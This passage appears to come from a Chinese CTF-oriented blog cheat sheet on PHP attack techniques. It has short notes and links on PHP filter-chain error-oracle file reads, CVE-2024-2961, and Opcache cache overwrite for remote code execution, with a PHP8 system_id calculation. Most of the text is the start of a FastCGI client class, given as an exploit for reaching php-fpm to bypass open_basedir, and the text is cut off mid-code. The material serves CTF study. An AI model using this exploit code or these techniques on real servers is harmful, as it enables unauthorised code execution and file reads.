d <span class="token operator">=</span> <span class="token function">b64decode</span><span class="token punctuation">(</span>o<span class="token operator">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string single-quoted-string">'='</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span>
<span class="token comment"># remove KR padding</span>
d <span class="token operator">=</span> d<span class="token operator">.</span><span class="token function">replace</span><span class="token punctuation">(</span>b<span class="token string single-quoted-string">'$)C'</span><span class="token punctuation">,</span>b<span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">b64decode</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="file-read-from-error-based-oracle"><a href="#file-read-from-error-based-oracle" class="headerlink" title="file read from error-based oracle"></a>file read from error-based oracle</h2><p>详细解析：<a target="_blank" rel="noopener" href="https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle">https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle</a></p>
<p>exp：<a target="_blank" rel="noopener" href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a></p>
<p>相关题目：</p>
<p><a href="/blog/2024/04/03/%E7%BA%A2%E6%98%8E%E8%B0%B72024/#ezphp-%E5%A4%8D%E7%8E%B0">红明谷2024 ezphp</a></p>
<p><a href="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/#file-copy">2024春秋杯冬季赛 file_copy</a></p>
<h2 id="cnext-CVE-2024-2961"><a href="#cnext-CVE-2024-2961" class="headerlink" title="cnext (CVE-2024-2961)"></a>cnext (CVE-2024-2961)</h2><p>至此，文件包含不存在了</p>
<p><a href="/blog/2024/05/31/CVE-2024-2961%E5%A4%8D%E7%8E%B0/">CVE-2024-2961复现</a></p>
<hr>
<h1 id="Opcache缓存"><a href="#Opcache缓存" class="headerlink" title="Opcache缓存"></a>Opcache缓存</h1><p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/06/16/PHP8%20OPCACHE%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4RCE/">https://boogipop.com/2023/06/16/PHP8%20OPCACHE%E7%BC%93%E5%AD%98%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4RCE/</a></p>
<p>条件：</p>
<ul>
<li>启用 Opcache 扩展</li>
<li>存在任意文件写入或覆盖</li>
</ul>
<p>PHP7 system_id计算脚本：<a target="_blank" rel="noopener" href="https://github.com/GoSecure/php7-opcache-override">https://github.com/GoSecure/php7-opcache-override</a></p>
<p>覆盖 .php.bin 文件实现 rce</p>
<p>opache.validate_timestamps &#x3D; On 时需要修改时间戳，此时需要想办法获取当前的时间戳</p>
<p>PHP8 system_id：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"8.2.6API420220829,NTSBIN_4888(size_t)8\002"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>





<hr>
<h1 id="open-basedir-绕过"><a href="#open-basedir-绕过" class="headerlink" title="open_basedir 绕过"></a>open_basedir 绕过</h1><p>限制了目录访问</p>
<h2 id="FastCGI-amp-php-fpm"><a href="#FastCGI-amp-php-fpm" class="headerlink" title="FastCGI&amp;php-fpm"></a>FastCGI&amp;php-fpm</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<p>exp：未经完整复现，不保证可用性</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">TimedOutException</span> <span class="token keyword">extends</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">ForbiddenException</span> <span class="token keyword">extends</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Client</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token constant">VERSION_1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">BEGIN_REQUEST</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">ABORT_REQUEST</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">END_REQUEST</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">PARAMS</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">STDIN</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">STDOUT</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">STDERR</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">DATA</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">GET_VALUES</span> <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">GET_VALUES_RESULT</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_TYPE</span> <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MAXTYPE</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">UNKNOWN_TYPE</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">RESPONDER</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">AUTHORIZER</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">FILTER</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">REQUEST_COMPLETE</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">CANT_MPX_CONN</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">OVERLOADED</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">UNKNOWN_ROLE</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MAX_CONNS</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_CONNS'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MAX_REQS</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'MAX_REQS'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">MPXS_CONNS</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'MPXS_CONNS'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">HEADER_LEN</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">REQ_STATE_WRITTEN</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">REQ_STATE_OK</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">REQ_STATE_ERR</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">REQ_STATE_TIMED_OUT</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_sock</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_host</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_port</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_keepAlive</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_requests</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_persistentSocket</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_connectTimeout</span> <span class="token operator">=</span> <span class="token number">5000</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_readWriteTimeout</span> <span class="token operator">=</span> <span class="token number">5000</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span> <span class="token variable">$host</span><span class="token punctuation">,</span> <span class="token variable">$port</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_port</span> <span class="token operator">=</span> <span class="token variable">$port</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setKeepAlive</span><span class="token punctuation">(</span> <span class="token variable">$b</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getKeepAlive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setPersistentSocket</span><span class="token punctuation">(</span> <span class="token variable">$b</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$was_persistent</span>          <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_persistentSocket</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_persistentSocket</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">boolean</span><span class="token punctuation">)</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_persistentSocket</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$was_persistent</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getPersistentSocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_persistentSocket</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setConnectTimeout</span><span class="token punctuation">(</span> <span class="token variable">$timeoutMs</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_connectTimeout</span> <span class="token operator">=</span> <span class="token variable">$timeoutMs</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getConnectTimeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_connectTimeout</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setReadWriteTimeout</span><span class="token punctuation">(</span> <span class="token variable">$timeoutMs</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_readWriteTimeout</span> <span class="token operator">=</span> <span class="token variable">$timeoutMs</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">set_ms_timeout</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_readWriteTimeout</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getReadWriteTimeout</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_readWriteTimeout</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">set_ms_timeout</span><span class="token punctuation">(</span> <span class="token variable">$timeoutMs</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token function">stream_set_timeout</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token function">floor</span><span class="token punctuation">(</span> <span class="token variable">$timeoutMs</span> <span class="token operator">/</span> <span class="token number">1000</span> <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span> <span class="token variable">$timeoutMs</span> <span class="token operator">%</span> <span class="token number">1000</span> <span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_persistentSocket</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">pfsockopen</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_connectTimeout</span> <span class="token operator">/</span> <span class="token number">1000</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_host</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_port</span><span class="token punctuation">,</span> <span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_connectTimeout</span> <span class="token operator">/</span> <span class="token number">1000</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_sock</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Unable to connect to FastCGI application: '</span> <span class="token operator">.</span> <span class="token variable">$errstr</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">set_ms_timeout</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_readWriteTimeout</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'Unable to set timeout on socket'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildPacket</span><span class="token punctuation">(</span> <span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$requestId</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$clen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span> <span class="token variable">$content</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">VERSION_1</span> <span class="token punctuation">)</span>         <span class="token comment">/* version */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token variable">$type</span> <span class="token punctuation">)</span>                    <span class="token comment">/* type */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$requestId</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span> <span class="token comment">/* requestIdB1 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token variable">$requestId</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span>        <span class="token comment">/* requestIdB0 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$clen</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span>     <span class="token comment">/* contentLengthB1 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token variable">$clen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span>             <span class="token comment">/* contentLengthB0 */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token number">0</span> <span class="token punctuation">)</span>                        <span class="token comment">/* paddingLength */</span>
            <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token number">0</span> <span class="token punctuation">)</span>                        <span class="token comment">/* reserved */</span>
            <span class="token operator">.</span> <span class="token variable">$content</span><span class="token punctuation">;</span>                     <span class="token comment">/* content */</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">buildNvpair</span><span class="token punctuation">(</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$nlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$vlen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span> <span class="token variable">$value</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$nlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">/* nameLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token variable">$nlen</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">24</span> <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$nlen</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token variable">$nlen</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$vlen</span> <span class="token operator">&lt;</span> <span class="token number">128</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">/* valueLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token variable">$vlen</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>
            <span class="token variable">$nvpair</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">24</span> <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x80</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token variable">$vlen</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token 